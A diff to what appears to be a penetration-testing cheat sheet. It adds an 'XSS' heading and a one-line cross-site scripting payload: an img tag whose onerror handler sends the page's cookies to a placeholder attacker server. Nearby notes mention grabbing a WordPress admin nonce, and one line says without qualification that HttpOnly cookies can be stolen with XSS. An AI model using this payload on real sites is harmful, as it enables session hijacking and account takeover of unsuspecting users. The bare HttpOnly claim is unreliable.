@@ -1,4 +1,4 @@
-
+### XSS
 
 **XSS Exploitation Example**
 - Grabbing a nonce value from /wp-admin/user-new.php
@@ -13,3 +13,4 @@
 
 
 Cookies with HttpOnly can be stolen with XSS
+- `<img src=x onerror=this.src='http://yourserver/?c='+document.cookie>`
